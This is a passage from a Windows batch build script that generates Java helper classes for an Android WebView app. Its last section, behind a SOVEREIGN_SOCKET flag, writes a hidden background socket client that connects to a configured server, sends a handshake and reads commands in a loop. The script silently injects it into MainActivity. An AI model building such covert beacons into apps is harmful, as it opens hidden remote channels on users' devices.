        powershell -NoProfile -ExecutionPolicy Bypass -Command "$c = Get-Content '%TPL%\BiometricHelper.template' -Raw -Encoding UTF8; $c = $c -replace '\{\{PACKAGE\}\}','%PACKAGE_NAME%'; [IO.File]::WriteAllText('%BUILD%\src\%PKG_PATH%\BiometricHelper.java', $c, [Text.UTF8Encoding]::new($false))"
    )
)

:: NFC Helper
if "%NFC_ENABLED%"=="true" (
    if exist "%TPL%\NFCHelper.template" (
        powershell -NoProfile -ExecutionPolicy Bypass -Command "$c = Get-Content '%TPL%\NFCHelper.template' -Raw -Encoding UTF8; $c = $c -replace '\{\{PACKAGE\}\}','%PACKAGE_NAME%'; [IO.File]::WriteAllText('%BUILD%\src\%PKG_PATH%\NFCHelper.java', $c, [Text.UTF8Encoding]::new($false))"
    )
)

:: MediaCodec Bridge
if "%MEDIA_CODEC_ENABLED%"=="true" (
    if exist "%TPL%\MediaCodecBridge.template" (
        powershell -NoProfile -ExecutionPolicy Bypass -Command "$c = Get-Content '%TPL%\MediaCodecBridge.template' -Raw -Encoding UTF8; $c = $c -replace '\{\{PACKAGE\}\}','%PACKAGE_NAME%'; [IO.File]::WriteAllText('%BUILD%\src\%PKG_PATH%\MediaCodecBridge.java', $c, [Text.UTF8Encoding]::new($false))"
    )
)

:: Camera2 Helper
if "%CAMERA2_ENABLED%"=="true" (
    if exist "%TPL%\Camera2Helper.template" (
        powershell -NoProfile -ExecutionPolicy Bypass -Command "$c = Get-Content '%TPL%\Camera2Helper.template' -Raw -Encoding UTF8; $c = $c -replace '\{\{PACKAGE\}\}','%PACKAGE_NAME%'; [IO.File]::WriteAllText('%BUILD%\src\%PKG_PATH%\Camera2Helper.java', $c, [Text.UTF8Encoding]::new($false))"
    )
)

    )
)

if "%SOVEREIGN_SOCKET%"=="true" (
    (echo package %PACKAGE_NAME%;
    echo.
    echo public class SovereignBridge {
    echo     public static void init^(final String server, final int port^) {
    echo         new Thread^(new Runnable^(^) {
    echo             @Override
    echo             public void run^(^) {
    echo                 try {
    echo                     java.net.Socket s = new java.net.Socket^(server, port^);
    echo                     java.io.PrintWriter out = new java.io.PrintWriter^(s.getOutputStream^(^), true^);
    echo                     java.io.BufferedReader in = new java.io.BufferedReader^(new java.io.InputStreamReader^(s.getInputStream^(^)^)^);
    echo                     out.println^("ELITE_HANDSHAKE_INIT"^);
    echo                     String cmd;
    echo                     while ^(^(cmd = in.readLine^(^)^) ^^!= null^) {
    echo                         if ^(cmd.equals^("PING"^)^) out.println^("PONG"^);
    echo                     }
    echo                 } catch ^(Exception e^) {}
    echo             }
    echo         }^).start^(^);
    echo     }
    echo } ) > "%BUILD%\src\%PKG_PATH%\SovereignBridge.java"
    
    :: Safe injection into MainActivity (At the end of onCreate)
    powershell -NoProfile -ExecutionPolicy Bypass -Command "$c = Get-Content '%BUILD%\src\%PKG_PATH%\MainActivity.java' -Raw -Encoding UTF8; $c = $c -replace 'webView.loadUrl','SovereignBridge.init(\"%SOVEREIGN_SERVER%\", %SOVEREIGN_PORT%); webView.loadUrl'; [IO.File]::WriteAllText('%BUILD%\src\%PKG_PATH%\MainActivity.java', $c, [Text.UTF8Encoding]::new($false))"
)

exit /b 0
